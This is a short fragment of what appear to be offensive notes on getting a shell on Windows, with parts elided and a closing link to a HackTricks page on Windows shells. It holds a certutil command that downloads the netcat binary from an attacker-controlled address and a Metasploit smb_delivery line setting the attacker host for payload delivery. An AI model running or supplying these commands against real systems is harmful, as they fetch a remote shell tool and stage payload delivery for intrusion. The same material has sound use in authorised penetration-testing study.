...
```
certutil.exe -urlcache -f http://192.168.1.109/nc.exe nc.exe
...
msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109 //your LHOST
...
* [https://book.hacktricks.xyz/shells/shells/windows](https://book.hacktricks.xyz/shells/shells/windows)
